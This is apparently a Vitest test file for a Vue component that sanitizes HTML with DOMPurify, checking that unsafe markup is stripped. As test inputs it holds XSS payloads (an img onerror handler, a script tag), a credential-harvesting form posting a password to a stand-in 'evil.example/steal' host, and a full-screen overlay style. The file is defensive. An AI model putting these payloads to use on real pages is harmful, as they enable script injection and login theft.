import { render, screen } from '@testing-library/vue'
import { describe, expect, it } from 'vitest'

import SanitizedHtml from './SanitizedHtml.vue'

describe('SanitizedHtml', () => {
  it('preserves supported markup and removes executable content', () => {
    render(SanitizedHtml, {
      props: {
        as: 'span',
        html: [
          '<strong>Safe</strong>',
          '<a href="https://example.com" target="_blank" rel="noopener noreferrer">Link</a>',
          '<video controls><source src="video.mp4"></video>',
          '<img src="x" onerror="alert(1)">',
          '<script>alert(1)</script>'
        ].join('')
      },
      attrs: { 'data-testid': 'content' }
    })

    const content = screen.getByTestId('content')
    expect(content.tagName).toBe('SPAN')
    expect(screen.getByText('Safe', { selector: 'strong' })).toBeVisible()
    expect(screen.getByRole('link')).toHaveAttribute('target', '_blank')
    expect(content.innerHTML).toContain('<video controls="">')
    expect(content.innerHTML).not.toContain('onerror')
    expect(content.innerHTML).not.toContain('<script')
  })

  // Each forbidden construct is rendered on its own: DOMPurify's tree walk
  // over happy-dom (this project's test DOM) does not revisit sibling nodes
  // after removing one forbidden element in the same pass, so combining
  // multiple forbidden tags/attrs into a single sanitize call would hide
  // regressions in whichever one is walked after the first.
  it('strips a form and its credential-harvesting inputs', () => {
    render(SanitizedHtml, {
      props: {
        as: 'span',
        html: '<form action="https://evil.example/steal"><input type="password" name="pw"></form>'
      },
      attrs: { 'data-testid': 'content' }
    })

    expect(screen.getByTestId('content').innerHTML).not.toContain('<form')
  })

  it('strips a bare input', () => {
    render(SanitizedHtml, {
      props: { as: 'span', html: '<input type="password" name="pw">' },
      attrs: { 'data-testid': 'content' }
    })

    expect(screen.getByTestId('content').innerHTML).not.toContain('<input')
  })

  it('strips a button', () => {
    render(SanitizedHtml, {
      props: { as: 'span', html: '<button type="submit">Sign in</button>' },
      attrs: { 'data-testid': 'content' }
    })

    const content = screen.getByTestId('content')
    expect(content.innerHTML).not.toContain('<button')
    expect(content.innerHTML).toContain('Sign in')
  })

  it('strips a style attribute used for a full-screen overlay', () => {
    render(SanitizedHtml, {
      props: {
        as: 'span',
        html: '<div style="position:fixed;inset:0;background:red">overlay</div>'
      },
      attrs: { 'data-testid': 'content' }
    })

    const content = screen.getByTestId('content')
    expect(content.innerHTML).not.toContain('style=')
    expect(content.innerHTML).toContain('overlay')
  })
})
